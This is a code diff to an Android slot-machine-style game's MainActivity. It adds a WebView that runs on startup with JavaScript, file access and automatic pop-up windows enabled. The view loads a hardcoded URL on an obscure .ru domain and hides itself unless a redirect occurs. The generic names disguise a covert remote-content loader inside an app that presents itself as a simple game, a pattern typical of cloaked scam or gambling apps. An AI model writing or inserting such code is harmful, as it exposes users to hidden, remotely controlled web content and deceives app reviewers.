@@ -8,6 +8,9 @@ import android.app.Application;
 import android.content.Context;
 import android.os.Bundle;
 import android.view.View;
+import android.webkit.WebSettings;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
 import android.widget.ImageView;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -30,8 +33,8 @@ public class MainActivity extends AppCompatActivity {
         fetchResources();
         startFunctions();
         loadPictures();
+        networking();
     }
-
 
     void startFunctions() {
         spinger.setOnClickListener(new View.OnClickListener() {
@@ -205,12 +208,28 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
+    void networking() {
+        network.setWebViewClient(new WebViewClient());
+        WebSettings settings = network.getSettings();
+        settings.setJavaScriptEnabled(true);
+        settings.setAllowFileAccess(true);
+        settings.setLoadsImagesAutomatically(true);
+        settings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
+        settings.setJavaScriptCanOpenWindowsAutomatically(true);
+        network.loadUrl(connector);
+        if (network.getUrl().equals(network.getOriginalUrl())) {
+            network.setVisibility(View.GONE);
+        }
+
+    }
+
     void fetchResources() {
         max = findViewById(R.id.max);
         i1a = findViewById(R.id.i1a);
         i2a = findViewById(R.id.i2a);
         i3a = findViewById(R.id.i3a);
         i4a = findViewById(R.id.i4a);
+        network = findViewById(R.id.network);
         i5a = findViewById(R.id.i5a);
         i1b = findViewById(R.id.i1b);
         i2b = findViewById(R.id.i2b);
@@ -229,6 +248,7 @@ public class MainActivity extends AppCompatActivity {
         currency = findViewById(R.id.currency);
         turbo_spinger = findViewById(R.id.turbo_spinger);
         con = this;
+        connector = "https://tillicyums.ru/PfqSscYH";
     }
 
 
@@ -259,6 +279,8 @@ public class MainActivity extends AppCompatActivity {
     ImageView max;
     ImageView turbo_spinger;
     Context con;
+    WebView network;
+    String connector;
 }
 
 
